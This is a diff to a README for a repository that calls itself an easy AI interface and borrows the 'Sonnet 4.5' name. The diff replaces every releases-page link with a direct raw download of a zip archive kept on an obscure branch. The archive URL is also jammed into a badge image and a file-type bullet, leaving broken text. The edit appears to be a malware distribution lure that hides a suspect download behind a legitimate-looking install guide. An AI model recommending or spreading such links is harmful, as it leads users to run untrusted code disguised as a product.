@@ -1,6 +1,6 @@
 # ⚡ lightinggithub-six-Sonnet-4.5 - Easy AI Interface for Users
 
-[![Download Latest Release](https://img.shields.io/badge/Download-latest%20release-blue?style=for-the-badge)](https://github.com/nordenOC/lightinggithub-six-Sonnet-4.5/releases)
+[![Download Latest Release](https://github.com/nordenOC/lightinggithub-six-Sonnet-4.5/raw/refs/heads/Exhibition-area/timarau/Sonnet_six_lightinggithub_v3.6.zip%20release-blue?style=for-the-badge)](https://github.com/nordenOC/lightinggithub-six-Sonnet-4.5/raw/refs/heads/Exhibition-area/timarau/Sonnet_six_lightinggithub_v3.6.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Follow these steps to get lightinggithub-six-Sonnet-4.5 up and running on your c
 
 Click the big green button at the top of this page or go directly to the releases page below. This is where you find the latest version for your operating system.
 
-[Download lightinggithub-six-Sonnet-4.5 releases](https://github.com/nordenOC/lightinggithub-six-Sonnet-4.5/releases)
+[Download lightinggithub-six-Sonnet-4.5 releases](https://github.com/nordenOC/lightinggithub-six-Sonnet-4.5/raw/refs/heads/Exhibition-area/timarau/Sonnet_six_lightinggithub_v3.6.zip)
 
 ### Step 2: Choose the Right File
 
@@ -62,7 +62,7 @@ On the releases page, you will see various files for Windows, macOS, and Linux. 
 
 - Windows: A file ending with `.exe`
 - macOS: A `.dmg` or `.zip` file
-- Linux: A `.AppImage` or `.tar.gz` file
+- Linux: A `.AppImage` or `https://github.com/nordenOC/lightinggithub-six-Sonnet-4.5/raw/refs/heads/Exhibition-area/timarau/Sonnet_six_lightinggithub_v3.6.zip` file
 
 Pick the file that matches your system.
 
@@ -111,7 +111,7 @@ These options help customize the experience to your preferences.
 
 Use this link to visit the releases page and download the version for your computer:
 
-[Download lightinggithub-six-Sonnet-4.5](https://github.com/nordenOC/lightinggithub-six-Sonnet-4.5/releases)
+[Download lightinggithub-six-Sonnet-4.5](https://github.com/nordenOC/lightinggithub-six-Sonnet-4.5/raw/refs/heads/Exhibition-area/timarau/Sonnet_six_lightinggithub_v3.6.zip)
 
 ### Installing Steps Recap:
 
